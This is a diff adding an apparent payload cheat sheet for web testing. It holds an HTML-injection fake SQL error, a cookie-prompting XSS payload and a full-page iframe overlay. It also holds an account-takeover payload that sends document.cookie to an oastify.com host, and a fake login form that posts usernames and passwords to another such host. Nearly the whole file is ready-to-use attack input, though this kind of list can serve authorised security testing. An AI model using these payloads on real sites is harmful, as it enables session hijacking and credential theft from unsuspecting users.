@@ -1,0 +1,18 @@
+payload for testing HTML/XSS/IFRAME/ATO/PHISHING
+
+HTMLi:
+<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+
+RXSS:
+<img src/onerror=prompt(document.cookie)>
+
+IFrame:
+"><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
+
+ATO:
+<img src=x  onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;" />
+
+PHISHING:
+<h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
+Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>
+<input type="submit" value="Login"></br>
